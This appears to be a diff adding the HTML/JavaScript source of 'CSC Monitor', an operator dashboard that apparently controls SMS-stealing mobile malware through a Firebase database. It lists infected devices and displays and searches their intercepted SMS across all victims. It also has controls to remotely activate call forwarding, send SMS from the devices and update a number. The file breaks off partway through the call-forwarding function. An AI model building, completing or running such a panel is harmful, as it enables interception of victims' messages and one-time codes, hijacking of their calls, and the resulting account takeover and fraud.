@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>CSC Monitor</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+:root {
+  --purple:#5b21b6; --purple2:#7c3aed; --purpleL:#ede9fe;
+  --bg:#f0f2f5; --white:#fff; --green:#16a34a; --red:#dc2626;
+  --orange:#ea580c; --text:#1e293b; --muted:#64748b; --border:#e2e8f0;
+  --shadow:0 2px 8px rgba(0,0,0,.10);
+}
+body { font-family:'Segoe UI',sans-serif; background:var(--bg); color:var(--text); min-height:100vh; }
+
+/* ===== SETUP ===== */
+#setup-screen { min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; background:linear-gradient(135deg,#4c1d95,#1e1b4b); }
+.setup-card { background:#fff; border-radius:20px; padding:32px 24px; width:100%; max-width:440px; box-shadow:0 8px 32px rgba(0,0,0,.25); }
+.setup-logo { text-align:center; margin-bottom:24px; }
+.setup-logo .ic { font-size:48px; }
+.setup-logo h1 { font-size:22px; font-weight:700; color:var(--purple); margin-top:8px; }
+.setup-logo p { font-size:13px; color:var(--muted); margin-top:4px; }
+.fg { margin-bottom:14px; }
+.fg label { display:block; font-size:11px; font-weight:700; color:var(--muted); text-transform:uppercase; letter-spacing:.7px; margin-bottom:5px; }
+.fg input { width:100%; border:1.5px solid var(--border); border-radius:10px; padding:11px 13px; font-size:14px; outline:none; transition:border-color .2s; font-family:inherit; }
+.fg input:focus { border-color:var(--purple2); }
+.pbtn { width:100%; background:linear-gradient(135deg,var(--purple),var(--purple2)); color:#fff; border:none; border-radius:10px; padding:14px; font-size:15px; font-weight:700; cursor:pointer; margin-top:6px; font-family:inherit; }
+.pbtn:disabled { opacity:.5; cursor:not-allowed; }
+.errbox { background:#fef2f2; border:1px solid #fecaca; color:#b91c1c; padding:10px 13px; border-radius:8px; font-size:13px; margin-top:10px; display:none; }
+
+/* ===== TOPBAR ===== */
+.topbar { background:linear-gradient(135deg,var(--purple),var(--purple2)); padding:14px 16px; display:flex; align-items:center; justify-content:space-between; position:sticky; top:0; z-index:200; box-shadow:0 2px 10px rgba(91,33,182,.4); }
+.tb-left { display:flex; align-items:center; gap:8px; color:#fff; font-size:16px; font-weight:700; }
+.live-dot { width:8px; height:8px; border-radius:50%; background:#4ade80; box-shadow:0 0 8px #4ade80; animation:pulse 2s infinite; }
+@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:.3;} }
+.tb-right { display:flex; gap:8px; }
+.xbtn { background:rgba(255,255,255,.2); color:#fff; border:none; border-radius:8px; padding:6px 13px; font-size:12px; font-weight:600; cursor:pointer; font-family:inherit; }
+
+/* ===== APP ===== */
+#app { display:none; flex-direction:column; min-height:100vh; }
+
+/* Search */
+.search-sec { background:#fff; padding:10px 15px; border-bottom:1px solid var(--border); position:sticky; top:57px; z-index:190; }
+.sw { position:relative; }
+.sw input { width:100%; border:1.5px solid var(--border); border-radius:10px; padding:10px 36px 10px 38px; font-size:14px; outline:none; font-family:inherit; }
+.sw input:focus { border-color:var(--purple2); }
+.s-ic { position:absolute; left:12px; top:50%; transform:translateY(-50%); font-size:16px; }
+.s-cl { position:absolute; right:11px; top:50%; transform:translateY(-50%); background:none; border:none; font-size:15px; color:var(--muted); cursor:pointer; display:none; }
+
+/* Register bar */
+.reg-bar { background:#fff; padding:8px 15px; border-bottom:1px solid var(--border); font-size:13px; color:var(--muted); text-align:center; font-weight:600; }
+
+/* Stats */
+.stats-row { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; padding:12px 15px; }
+.stat-card { background:#fff; border-radius:12px; padding:14px 8px; text-align:center; box-shadow:var(--shadow); }
+.stat-num { font-size:26px; font-weight:800; line-height:1; }
+.stat-lbl { font-size:11px; color:var(--muted); margin-top:4px; font-weight:600; }
+
+/* Update No button */
+.upd-btn { display:block; margin:4px 15px 10px; width:calc(100% - 30px); background:linear-gradient(135deg,var(--purple),var(--purple2)); color:#fff; border:none; border-radius:10px; padding:14px; font-size:14px; font-weight:700; letter-spacing:1px; cursor:pointer; font-family:inherit; }
+
+/* Device List */
+.dev-list { padding:0 15px 80px; }
+.dev-card { background:#fff; border-radius:14px; padding:0; margin-bottom:10px; box-shadow:var(--shadow); cursor:pointer; overflow:hidden; transition:transform .1s; }
+.dev-card:active { transform:scale(.99); }
+.dev-top { display:flex; align-items:center; gap:12px; padding:14px 14px 10px; }
+.dev-num { font-size:16px; font-weight:700; color:var(--muted); min-width:22px; }
+.dev-icon { font-size:36px; }
+.dev-info { flex:1; }
+.dev-name { font-size:15px; font-weight:700; }
+.dev-id { font-size:11px; color:var(--muted); font-family:monospace; margin-top:2px; }
+.dev-bat { font-size:12px; color:var(--muted); margin-top:3px; }
+.dev-sms-badge { background:var(--purpleL); color:var(--purple2); font-size:11px; font-weight:700; padding:4px 10px; border-radius:20px; white-space:nowrap; }
+.dev-status { padding:8px 14px; border-top:1px solid var(--border); font-size:12px; font-weight:700; text-align:center; }
+.st-online { color:var(--green); }
+.st-offline { color:var(--red); }
+
+/* ===== DETAIL SCREEN ===== */
+#detail-screen { display:none; flex-direction:column; min-height:100vh; }
+.d-topbar { background:linear-gradient(135deg,var(--purple),var(--purple2)); padding:13px 15px; display:flex; align-items:center; gap:12px; position:sticky; top:0; z-index:200; }
+.bbtn { background:rgba(255,255,255,.2); color:#fff; border:none; border-radius:8px; padding:7px 13px; font-size:13px; cursor:pointer; font-family:inherit; }
+.d-title { color:#fff; font-size:15px; font-weight:700; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.d-actions { display:grid; grid-template-columns:1fr 1fr; gap:10px; padding:12px 15px; }
+.act-btn { background:linear-gradient(135deg,var(--purple),var(--purple2)); color:#fff; border:none; border-radius:10px; padding:14px 8px; font-size:13px; font-weight:700; cursor:pointer; font-family:inherit; }
+
+/* SMS Cards */
+.sms-wrap { padding:0 15px 80px; }
+.sms-card { background:#fff; border-radius:14px; padding:13px 14px; margin-bottom:10px; box-shadow:var(--shadow); }
+.sms-addr { font-size:14px; font-weight:700; margin-bottom:5px; }
+.sms-body { font-size:13px; color:var(--muted); line-height:1.6; word-break:break-word; }
+.sms-time { font-size:11px; color:var(--muted); text-align:right; margin-top:7px; }
+
+/* ===== SEARCH SCREEN ===== */
+#search-screen { display:none; flex-direction:column; min-height:100vh; }
+.sr-sum { padding:9px 15px 3px; font-size:13px; color:var(--muted); }
+.sr-list { padding:6px 15px 80px; }
+.src-card { background:#fff; border-radius:14px; padding:12px 14px; margin-bottom:10px; box-shadow:var(--shadow); cursor:pointer; }
+.src-badge { background:var(--purpleL); color:var(--purple); font-size:12px; font-weight:700; padding:3px 10px; border-radius:20px; display:inline-block; margin-bottom:8px; }
+.hl { background:#fef08a; color:#713f12; border-radius:3px; padding:0 2px; }
+
+/* ===== DIALOGS ===== */
+.overlay { position:fixed; inset:0; background:rgba(0,0,0,.5); z-index:500; display:none; align-items:flex-end; justify-content:center; }
+.dialog { background:#fff; border-radius:20px 20px 0 0; width:100%; max-width:460px; max-height:90vh; overflow-y:auto; animation:slideUp .22s ease; }
+@keyframes slideUp { from{transform:translateY(80px);opacity:0;} to{transform:translateY(0);opacity:1;} }
+.dlg-hdr { padding:16px 20px; text-align:center; font-size:16px; font-weight:700; color:#fff; background:linear-gradient(135deg,#f87171,#fb923c); }
+.dlg-body { padding:18px 18px 28px; }
+.di { width:100%; border:1.5px solid var(--border); border-radius:10px; padding:12px 13px; font-size:15px; outline:none; margin-bottom:11px; font-family:inherit; }
+.di:focus { border-color:var(--purple2); }
+.di::placeholder { color:var(--muted); }
+.dbtn { width:100%; background:linear-gradient(135deg,var(--purple),var(--purple2)); color:#fff; border:none; border-radius:10px; padding:13px; font-size:14px; font-weight:700; cursor:pointer; margin-bottom:9px; font-family:inherit; }
+.dbtn-row { display:grid; grid-template-columns:1fr 1fr; gap:9px; margin-bottom:9px; }
+.dbtn-h { background:linear-gradient(135deg,var(--purple),var(--purple2)); color:#fff; border:none; border-radius:10px; padding:13px; font-size:13px; font-weight:700; cursor:pointer; font-family:inherit; }
+.dbtn-h.red { background:linear-gradient(135deg,#dc2626,#ef4444); }
+.dbtn-cancel { width:100%; background:var(--bg); color:var(--muted); border:1px solid var(--border); border-radius:10px; padding:12px; font-size:14px; cursor:pointer; font-family:inherit; }
+.cf-res { background:#f0fdf4; border:1px solid #bbf7d0; color:#15803d; padding:9px 12px; border-radius:8px; font-size:13px; margin-bottom:10px; display:none; text-align:center; }
+.sim-opt { display:flex; align-items:center; gap:12px; border:1.5px solid var(--border); border-radius:10px; padding:12px 13px; margin-bottom:9px; cursor:pointer; }
+.sim-opt.sel { border-color:var(--purple2); background:var(--purpleL); }
+.sim-ic { font-size:22px; }
+.sim-inf { flex:1; }
+.sim-nm { font-size:14px; font-weight:600; }
+.sim-no { font-size:12px; color:var(--muted); }
+.sim-rb { width:18px; height:18px; border-radius:50%; border:2px solid var(--border); flex-shrink:0; display:flex; align-items:center; justify-content:center; }
+.sim-rb.chk { border-color:var(--purple2); }
+.sim-rb.chk::after { content:""; width:9px; height:9px; border-radius:50%; background:var(--purple2); }
+.fwd-lbl { font-size:13px; color:var(--muted); text-align:center; margin-bottom:8px; }
+
+/* States */
+.loading { display:flex; align-items:center; justify-content:center; padding:50px 15px; gap:12px; color:var(--muted); font-size:14px; }
+.spinner { width:22px; height:22px; border:2.5px solid var(--border); border-top-color:var(--purple2); border-radius:50%; animation:spin .8s linear infinite; }
+@keyframes spin { to{transform:rotate(360deg);} }
+.empty { text-align:center; padding:50px 15px; color:var(--muted); }
+.empty .ei { font-size:40px; margin-bottom:10px; opacity:.5; }
+.empty p { font-size:14px; }
+
+#toast { position:fixed; bottom:24px; left:50%; transform:translateX(-50%); background:#1e293b; color:#fff; padding:10px 22px; border-radius:22px; font-size:13px; z-index:9999; opacity:0; pointer-events:none; transition:opacity .28s; white-space:nowrap; }
+::-webkit-scrollbar { width:4px; }
+::-webkit-scrollbar-thumb { background:#cbd5e1; border-radius:4px; }
+</style>
+</head>
+<body>
+
+<!-- SETUP -->
+<div id="setup-screen">
+  <div class="setup-card">
+    <div class="setup-logo">
+      <div class="ic">&#128225;</div>
+      <h1>CSC Monitor</h1>
+      <p>Firebase Realtime Database Dashboard</p>
+    </div>
+    <div class="fg">
+      <label>Firebase Database URL</label>
+      <input id="cfg-url" placeholder="https://xxx-default-rtdb.firebaseio.com" autocomplete="off" />
+    </div>
+    <div class="fg">
+      <label>API Key</label>
+      <input id="cfg-key" type="password" placeholder="AIzaSy..." />
+    </div>
+    <div class="fg">
+      <label>Project ID</label>
+      <input id="cfg-pid" placeholder="your-project-id" autocomplete="off" />
+    </div>
+    <div class="fg">
+      <label>Main Node <span style="font-weight:400;text-transform:none;letter-spacing:0">(default: csc6)</span></label>
+      <input id="cfg-node" value="csc6" />
+    </div>
+    <button class="pbtn" id="setup-btn" onclick="doSetup()">&#128279; Connect &amp; Open</button>
+    <div class="errbox" id="setup-err"></div>
+  </div>
+</div>
+
+<!-- APP -->
+<div id="app">
+  <div class="topbar">
+    <div class="tb-left">
+      <span class="live-dot"></span>
+      &#128225; CSC Monitor
+    </div>
+    <div class="tb-right">
+      <button class="xbtn" onclick="refreshNow()">&#8635; Refresh</button>
+      <button class="xbtn" onclick="doLogout()">Logout</button>
+    </div>
+  </div>
+  <div class="search-sec">
+    <div class="sw">
+      <span class="s-ic">&#128269;</span>
+      <input id="gsearch" placeholder="Search SMS across all devices..." oninput="onSearch(this.value)" />
+      <button class="s-cl" id="s-cl-btn" onclick="clearSearch()">&#10005;</button>
+    </div>
+  </div>
+  <div id="main-view">
+    <div class="reg-bar" id="reg-bar">Register : &#8212;</div>
+    <div class="stats-row">
+      <div class="stat-card">
+        <div class="stat-num" id="st-total" style="color:var(--purple2)">0</div>
+        <div class="stat-lbl">Devices</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num" id="st-online" style="color:var(--green)">0</div>
+        <div class="stat-lbl">Online</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num" id="st-sms" style="color:var(--orange)">0</div>
+        <div class="stat-lbl">Total SMS</div>
+      </div>
+    </div>
+    <button class="upd-btn" onclick="openUpdNo()">UPDATE NO</button>
+    <div class="dev-list" id="dev-list">
+      <div class="loading"><div class="spinner"></div>&nbsp;Loading devices...</div>
+    </div>
+  </div>
+</div>
+
+<!-- DETAIL -->
+<div id="detail-screen">
+  <div class="d-topbar">
+    <button class="bbtn" onclick="goBack()">&#8592; Back</button>
+    <div class="d-title" id="d-title">Device</div>
+  </div>
+  <div class="d-actions">
+    <button class="act-btn" onclick="openCallFwd()">&#128222; CALL FORWARDING</button>
+    <button class="act-btn" onclick="openSmsSend()">&#9993; SMS SEND</button>
+  </div>
+  <div class="sms-wrap" id="sms-list"></div>
+</div>
+
+<!-- SEARCH -->
+<div id="search-screen">
+  <div class="topbar" style="position:sticky;top:0;z-index:200;">
+    <div class="tb-left">&#128269; Search Results</div>
+    <div class="tb-right"><button class="xbtn" onclick="clearSearch()">&#8592; Back</button></div>
+  </div>
+  <div class="sr-sum" id="sr-sum"></div>
+  <div class="sr-list" id="sr-list"></div>
+</div>
+
+<!-- DIALOG: Call Forwarding -->
+<div class="overlay" id="dlg-cf">
+  <div class="dialog">
+    <div class="dlg-hdr">&#128222; Call Forwarding</div>
+    <div class="dlg-body">
+      <div id="sim-list"></div>
+      <div class="fwd-lbl">Forward To Number</div>
+      <input class="di" id="cf-num" placeholder="Enter number" type="tel" />
+      <div class="dbtn-row">
+        <button class="dbtn-h" onclick="doCF('active')">ACTIVE</button>
+        <button class="dbtn-h red" onclick="doCF('deactive')">DEACTIVE</button>
+      </div>
+      <button class="dbtn" onclick="doCF('check')">CALL FORWARDING CHECK</button>
+      <div class="cf-res" id="cf-res"></div>
+      <button class="dbtn-cancel" onclick="closeDialog('dlg-cf')">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<!-- DIALOG: SMS Send -->
+<div class="overlay" id="dlg-sms">
+  <div class="dialog">
+    <div class="dlg-hdr">&#9993; Send SMS Customer</div>
+    <div class="dlg-body">
+      <input class="di" id="sms-to" placeholder="Your Number" type="tel" />
+      <textarea class="di" id="sms-msg" placeholder="Message Box" rows="4" style="resize:none;"></textarea>
+      <button class="dbtn" onclick="doSendSms()">SMS SEND</button>
+      <button class="dbtn-cancel" onclick="closeDialog('dlg-sms')">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<!-- DIALOG: Update No -->
+<div class="overlay" id="dlg-upd">
+  <div class="dialog">
+    <div class="dlg-hdr">&#8635; Update Number</div>
+    <div class="dlg-body">
+      <input class="di" id="upd-num" placeholder="Your number" type="tel" />
+      <button class="dbtn" onclick="doUpdateNo()">UPDATE</button>
+      <button class="dbtn-cancel" onclick="closeDialog('dlg-upd')">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<div id="toast"></div>
+
+<script>
+/* ======== STATE ======== */
+var DB = '', KEY = '', NODE = 'csc6';
+var DEVS = {}, CUR = null, SEL_SIM = 0;
+var POLL = null, TTIMER = null;
+
+/* ======== FIREBASE REST ======== */
+function fbURL(path) {
+  var u = DB + '/' + path + '.json';
+  if (KEY) u += '?auth=' + encodeURIComponent(KEY);
+  return u;
+}
+
+function fbGet(path) {
+  var ctrl = window.AbortController ? new AbortController() : null;
+  var timer;
+  var p = fetch(fbURL(path), ctrl ? {signal: ctrl.signal} : {})
+    .then(function(r) { clearTimeout(timer); return r.json(); });
+  if (ctrl) {
+    timer = setTimeout(function() { ctrl.abort(); }, 9000);
+  }
+  return p;
+}
+
+function fbSet(path, data) {
+  return fetch(fbURL(path), {
+    method: 'PUT',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(data)
+  }).then(function(r) { return r.json(); });
+}
+
+/* ======== SETUP ======== */
+function doSetup() {
+  var u = (document.getElementById('cfg-url').value || '').trim().replace(/\/+$/, '');
+  var k = (document.getElementById('cfg-key').value || '').trim();
+  var p = (document.getElementById('cfg-pid').value || '').trim();
+  var n = (document.getElementById('cfg-node').value || '').trim();
+  hideErr();
+  if (!u) { showErr('Firebase Database URL daalo!'); return; }
+  if (!u.startsWith('https://')) { showErr('URL https:// se shuru hona chahiye'); return; }
+  if (!p) { showErr('Project ID daalo!'); return; }
+  DB = u; KEY = k; NODE = n || 'csc6';
+  var btn = document.getElementById('setup-btn');
+  btn.disabled = true; btn.textContent = 'Connecting...';
+
+  /* Timeout after 9s */
+  var timedOut = false;
+  var tout = setTimeout(function() {
+    timedOut = true;
+    showErr('Timeout! Firebase se connection nahi hua. Database Rules check karo.');
+    btn.disabled = false; btn.textContent = '&#128279; Connect & Open';
+  }, 9000);
+
+  fetch(fbURL(NODE + '/All_User'))
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (timedOut) return;
+      clearTimeout(tout);
+      if (data && data.error) {
+        showErr('Firebase Error: ' + data.error);
+        btn.disabled = false; btn.textContent = '&#128279; Connect & Open';
+        return;
+      }
+      /* Launch immediately with data */
+      launchApp(data);
+    })
+    .catch(function(e) {
+      if (timedOut) return;
+      clearTimeout(tout);
+      showErr('Connection fail! URL aur API Key check karo.');
+      btn.disabled = false; btn.textContent = '&#128279; Connect & Open';
+    });
+}
+
+function showErr(m) { var e = document.getElementById('setup-err'); e.textContent = m; e.style.display = 'block'; }
+function hideErr() { document.getElementById('setup-err').style.display = 'none'; }
+
+function launchApp(initialData) {
+  document.getElementById('setup-screen').style.display = 'none';
+  var a = document.getElementById('app');
+  a.style.display = 'flex'; a.style.flexDirection = 'column';
+  if (initialData) processData(initialData);
+  startPolling();
+}
+
+function doLogout() {
+  stopPolling();
+  ['app','detail-screen','search-screen'].forEach(function(id) {
+    document.getElementById(id).style.display = 'none';
+  });
+  document.getElementById('setup-screen').style.display = 'flex';
+  var btn = document.getElementById('setup-btn');
+  btn.disabled = false; btn.textContent = '&#128279; Connect & Open';
+  DEVS = {}; CUR = null;
+}
+
+/* ======== POLLING (every 5 seconds) ======== */
+function startPolling() {
+  stopPolling();
+  POLL = setInterval(function() {
+    fbGet(NODE + '/All_User').then(function(data) {
+      if (data && !data.error) processData(data);
+    }).catch(function() {});
+  }, 5000);
+}
+function stopPolling() { if (POLL) { clearInterval(POLL); POLL = null; } }
+
+function refreshNow() {
+  fbGet(NODE + '/All_User').then(function(data) {
+    if (data && !data.error) { processData(data); showToast('&#8635; Refreshed!'); }
+    else showToast('Refresh failed');
+  }).catch(function() { showToast('Network error'); });
+}
+
+/* ======== DATA PROCESSING ======== */
+/*
+  Firebase structure (csc6/All_User/<deviceKey>):
+    Info:
+      MobileName / mobileName / DeviceName / name
+      DeviceId   / deviceId   / device_id
+      Battery    / battery
+      Status     (Online / online / 1 / true)
+    Sms:
+      <smsKey>:
+        address / Address / sender / from / number
+        body    / Body    / message / Message / text / content
+        date    / Date    / timestamp / time
+    SimINFO / SimInfo / simInfo:
+      <simKey>:
+        number / phoneNumber / Number / SimNumber
+        operator / carrier / Operator / NetworkName / network
+    Call_For:
+      ForwardTo, Status, Sim
+    Data:
+      RegisterDate
+    SendSms   (write)
+    UpdateNo  (write)
+*/
+function processData(raw) {
+  if (!raw || typeof raw !== 'object') {
+    document.getElementById('dev-list').innerHTML = '<div class="empty"><div class="ei">&#128241;</div><p>Koi data nahi mila</p></div>';
+    return;
+  }
+
+  DEVS = {};
+  var totalSms = 0, online = 0;
+  var regDate = '';
+
+  var keys = Object.keys(raw);
+  for (var i = 0; i < keys.length; i++) {
+    var k = keys[i];
+    var v = raw[k];
+    if (typeof v !== 'object' || !v) continue;
+
+    /* Skip non-device keys */
+    if (!v.Info && !v.Sms && !v.SimINFO && !v.SimInfo && !v.simInfo && !v.Data) continue;
+
+    var info = v.Info || {};
+    var smsObj = v.Sms || {};
+    var simObj = v.SimINFO || v.SimInfo || v.simInfo || {};
+
+    /* Parse SMS */
+    var smsArr = [];
+    var skeys = Object.keys(smsObj);
+    for (var j = 0; j < skeys.length; j++) {
+      var sv = smsObj[skeys[j]];
+      if (typeof sv === 'object' && sv) {
+        sv._key = skeys[j];
+        smsArr.push(sv);
+      }
+    }
+    totalSms += smsArr.length;
+
+    /* Status */
+    var st = String(info.Status || v.Status || info.status || '').toLowerCase();
+    var isOn = (st === 'online' || st === '1' || st === 'true');
+    if (isOn) online++;
+
+    /* Register date */
+    if (!regDate && v.Data && v.Data.RegisterDate) {
+      regDate = v.Data.RegisterDate;
+    }
+
+    DEVS[k] = {
+      key: k,
+      name: info.MobileName || info.mobileName || info.DeviceName || info.name || k,
+      id:   info.DeviceId   || info.deviceId   || info.device_id  || k,
+      bat:  info.Battery    || info.battery    || '',
+      on:   isOn,
+      sms:  smsArr,
+      sim:  simObj,
+      cf:   v.Call_For || {}
+    };
+  }
+
+  /* Update stats */
+  var total = Object.keys(DEVS).length;
+  document.getElementById('st-total').textContent = total;
+  document.getElementById('st-online').textContent = online;
+  document.getElementById('st-sms').textContent = totalSms;
+  if (regDate) document.getElementById('reg-bar').textContent = 'Register : ' + regDate;
+
+  renderDevList();
+
+  /* Update detail if open */
+  if (CUR && document.getElementById('detail-screen').style.display === 'flex') {
+    renderSmsList(CUR);
+  }
+
+  /* Update search if active */
+  var q = (document.getElementById('gsearch').value || '').trim();
+  if (q) runSearch(q);
+}
+
+/* ======== RENDER DEVICE LIST ======== */
+function renderDevList() {
+  var el = document.getElementById('dev-list');
+  var devs = Object.values(DEVS);
+  if (!devs.length) {
+    el.innerHTML = '<div class="empty"><div class="ei">&#128241;</div><p>Koi device nahi mila</p></div>';
+    return;
+  }
+  var html = '';
+  for (var i = 0; i < devs.length; i++) {
+    var d = devs[i];
+    html += '<div class="dev-card" data-k="' + ea(d.key) + '" onclick="openDev(this)">';
+    html += '<div class="dev-top">';
+    html += '<div class="dev-num">' + (i+1) + '</div>';
+    html += '<div class="dev-icon">&#128241;</div>';
+    html += '<div class="dev-info">';
+    html += '<div class="dev-name">Mobile : ' + eh(d.name) + '</div>';
+    html += '<div class="dev-id">Device Id : ' + eh(d.id) + '</div>';
+    if (d.bat) {
+      html += '<div class="dev-bat">Battery : ' + eh(String(d.bat)) + '%</div>';
+    }
+    html += '</div>';
+    html += '<div class="dev-sms-badge">&#128172; ' + d.sms.length + '</div>';
+    html += '</div>';
+    html += '<div class="dev-status ';
+    html += d.on ? 'st-online">Status : Online User' : 'st-offline">Status : Offline User';
+    html += '</div>';
+    html += '</div>';
+  }
+  el.innerHTML = html;
+}
+
+function openDev(el) { openDevice(el.getAttribute('data-k')); }
+
+function openDevice(key) {
+  CUR = key;
+  document.getElementById('app').style.display = 'none';
+  document.getElementById('search-screen').style.display = 'none';
+  var ds = document.getElementById('detail-screen');
+  ds.style.display = 'flex'; ds.style.flexDirection = 'column';
+  document.getElementById('d-title').textContent = DEVS[key] ? DEVS[key].name : key;
+  renderSmsList(key);
+  window.scrollTo(0, 0);
+}
+
+/* ======== RENDER SMS ======== */
+function renderSmsList(key) {
+  var d = DEVS[key];
+  var el = document.getElementById('sms-list');
+  if (!d) { el.innerHTML = '<div class="empty"><div class="ei">&#128172;</div><p>Data nahi mila</p></div>'; return; }
+  var sms = d.sms.slice().sort(function(a, b) { return getTs(b) - getTs(a); });
+  if (!sms.length) { el.innerHTML = '<div class="empty"><div class="ei">&#128172;</div><p>Koi SMS nahi mila</p></div>'; return; }
+  var html = '';
+  for (var i = 0; i < sms.length; i++) {
+    var s = sms[i];
+    var addr = s.address || s.Address || s.sender || s.from || s.number || s.Number || '-';
+    var body = s.body || s.Body || s.message || s.Message || s.text || s.content || '-';
+    var t = s.date || s.Date || s.timestamp || s.time || '';
+    html += '<div class="sms-card">';
+    html += '<div class="sms-addr">Address : ' + eh(String(addr)) + '</div>';
+    html += '<div class="sms-body">' + eh(String(body)) + '</div>';
+    html += '<div class="sms-time">' + fmtDate(t) + '</div>';
+    html += '</div>';
+  }
+  el.innerHTML = html;
+}
+
+function goBack() {
+  document.getElementById('detail-screen').style.display = 'none';
+  var q = (document.getElementById('gsearch').value || '').trim();
+  if (q) {
+    var ss = document.getElementById('search-screen');
+    ss.style.display = 'flex'; ss.style.flexDirection = 'column';
+  } else {
+    var ap = document.getElementById('app');
+    ap.style.display = 'flex'; ap.style.flexDirection = 'column';
+  }
+  window.scrollTo(0, 0);
+}
+
+/* ======== SEARCH ======== */
+function onSearch(q) {
+  document.getElementById('s-cl-btn').style.display = q ? 'block' : 'none';
+  if (!q.trim()) {
+    document.getElementById('search-screen').style.display = 'none';
+    var ap = document.getElementById('app'); ap.style.display = 'flex'; ap.style.flexDirection = 'column';
+    return;
+  }
+  runSearch(q.trim());
+}
+
+function runSearch(q) {
+  document.getElementById('app').style.display = 'none';
+  document.getElementById('detail-screen').style.display = 'none';
+  var ss = document.getElementById('search-screen'); ss.style.display = 'flex'; ss.style.flexDirection = 'column';
+  var ql = q.toLowerCase(), results = [];
+  var devs = Object.values(DEVS);
+  for (var i = 0; i < devs.length; i++) {
+    var d = devs[i], matches = [];
+    for (var j = 0; j < d.sms.length; j++) {
+      var s = d.sms[j];
+      var bdy = (s.body||s.Body||s.message||s.Message||s.text||s.content||'').toLowerCase();
+      var adr = (s.address||s.Address||s.sender||s.from||s.number||'').toLowerCase();
+      if (bdy.indexOf(ql) !== -1 || adr.indexOf(ql) !== -1) matches.push(s);
+    }
+    if (matches.length) results.push({d: d, m: matches});
+  }
+  var total = 0;
+  for (var i = 0; i < results.length; i++) total += results[i].m.length;
+  document.getElementById('sr-sum').textContent = results.length
+    ? '"' + q + '" - ' + results.length + ' device, ' + total + ' SMS mila'
+    : '"' + q + '" - koi SMS nahi mila';
+  var el = document.getElementById('sr-list');
+  if (!results.length) { el.innerHTML = '<div class="empty"><div class="ei">&#128269;</div><p>Koi SMS nahi mila</p></div>'; return; }
+  var html = '';
+  for (var i = 0; i < results.length; i++) {
+    var r = results[i];
+    html += '<div class="src-card" data-k="' + ea(r.d.key) + '" onclick="srcClick(this)">';
+    html += '<span class="src-badge">&#128241; ' + eh(r.d.name) + '</span> ';
+    html += '<span style="font-size:12px;color:var(--muted)">' + r.m.length + ' SMS mila</span>';
+    var lim = Math.min(2, r.m.length);
+    for (var j = 0; j < lim; j++) {
+      var s = r.m[j];
+      var body = s.body||s.Body||s.message||s.Message||s.text||s.content||'';
+      var addr = s.address||s.Address||s.sender||s.from||s.number||'';
+      html += '<div class="sms-card" style="margin-top:8px;">';
+      html += '<div class="sms-addr">Address : ' + eh(String(addr)) + '</div>';
+      html += '<div class="sms-body">' + hlText(eh(String(body)), q) + '</div>';
+      html += '</div>';
+    }
+    if (r.m.length > 2) html += '<div style="font-size:12px;color:var(--purple2);text-align:center;padding:5px 0">+' + (r.m.length-2) + ' aur - tap karke dekho</div>';
+    html += '</div>';
+  }
+  el.innerHTML = html;
+}
+
+function srcClick(el) { openDevice(el.getAttribute('data-k')); }
+
+function clearSearch() {
+  document.getElementById('gsearch').value = '';
+  document.getElementById('s-cl-btn').style.display = 'none';
+  document.getElementById('search-screen').style.display = 'none';
+  var ap = document.getElementById('app'); ap.style.display = 'flex'; ap.style.flexDirection = 'column';
+}
+
+function hlText(text, q) {
+  if (!q) return text;
+  var out = '', lo = text.toLowerCase(), lq = q.toLowerCase(), i = 0;
+  while (true) {
+    var p = lo.indexOf(lq, i);
+    if (p === -1) { out += text.slice(i); break; }
+    out += text.slice(i, p) + '<span class="hl">' + text.slice(p, p+q.length) + '</span>';
+    i = p + q.length;
+  }
+  return out;
+}
+
+/* ======== CALL FORWARDING ======== */
+function openCallFwd() {
+  var d = DEVS[CUR]; if (!d) return;
+  var sims = d.sim, simKeys = Object.keys(sims), html = '';
+  if (simKeys.length) {
+    var lim = Math.min(2, simKeys.length);
+    for (var i = 0; i < lim; i++) {
+      var s = sims[simKeys[i]];
+      var num = s.number || s.phoneNumber || s.Number || s.PhoneNumber || s.SimNumber || '-';
+      var op = s.operator || s.carrier || s.Operator || s.NetworkName || s.network || '-';
+      html += '<div class="sim-opt' + (i===SEL_SIM?' sel':'') + '" data-s="'+i+'" onclick="selSim(this)">';
+      html += '<div class="sim-ic">&#128246;</div>';
+      html += '<div class="sim-inf"><div class="sim-nm">SIM - ' + (i+1) + '</div>';
+      html += '<div class="sim-no">' + eh(String(num)) + ' &#8212; ' + eh(String(op)) + '</div></div>';
+      html += '<div class="sim-rb' + (i===SEL_SIM?' chk':'') + '"></div>';
+      html += '</div>';
+    }
+  } else {
+    html  = '<div class="sim-opt sel" data-s="0" onclick="selSim(this)"><div class="sim-ic">&#128246;</div><div class="sim-inf"><div class="sim-nm">SIM - 1</div><div class="sim-no">-</div></div><div class="sim-rb chk"></div></div>';
+    html += '<div class="sim-opt" data-s="1" onclick="selSim(this)"><div class="sim-ic">&#128246;</div><div class="sim-inf"><div class="sim-nm">SIM - 2</div><div class="sim-no">not available</div></div><div class="sim-rb"></div></div>';
+  }
+  document.getElementById('sim-list').innerHTML = html;
+  document.getElementById('cf-res').style.display = 'none';
+  document.getElementById('cf-num').value = '';
+  openDialog('dlg-cf');
+}
+
+function selSim(el) {
+  SEL_SIM = parseInt(el.getAttribute('data-s'), 10);
+  var opts = document.querySelectorAll('.sim-opt');
+  for (var i = 0; i < opts.length; i++) {
+    var on = (i === SEL_SIM);
+    if (on) opts[i].classList.add('sel'); else opts[i].classList.remove('sel');
+    var rb = opts[i].querySelector('.sim-rb');
+    if (rb) { if (on) rb.classList.add('chk'); else rb.classList.remove('chk'); }
+  }
+}
+
+function doCF(action) {
+  var num = document.getElementById('cf-num').value.trim();
+  if (action !== 'check' && !num) { showToast('Number daalo!'); return; }
